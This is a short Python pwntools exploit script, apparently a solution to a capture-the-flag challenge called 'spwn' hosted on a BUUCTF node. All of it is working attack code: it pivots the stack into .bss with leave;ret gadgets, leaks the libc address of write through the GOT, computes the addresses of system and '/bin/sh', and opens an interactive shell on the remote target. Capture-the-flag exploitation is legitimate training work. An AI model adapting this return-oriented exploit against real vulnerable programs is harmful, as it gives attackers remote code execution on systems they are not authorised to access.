from pwn import *


# p = process("./spwn")
p = remote("node4.buuoj.cn", 28837)
pro = ELF("./spwn")


bss_addr = 0x0804A300
leave_ret = 0x08048511
write_p = pro.plt["write"]
write_g = pro.got["write"]
start = 0x080483A0

# leak
p.recvuntil("Hello good Ctfer!")
pad = cyclic(0x4)+p32(write_p)+p32(start)
pad += p32(1)+p32(write_g)+p32(4)
p.send(pad)
p.recvuntil("What do you want to say?")
pad = cyclic(0x18)+p32(bss_addr)+p32(leave_ret)
p.send(pad)

info = u32(p.recvuntil("Hello", drop=True))
print(hex(info))

# count offset 
base = info-0xd43c0
system = base+0x3a940
binsh = base+0x15902b

# attack
pad = cyclic(0x4)+p32(system)+p32(0)+p32(binsh)
p.send(pad)
pad = cyclic(0x18)+p32(bss_addr)+p32(leave_ret)
p.send(pad)


p.interactive()

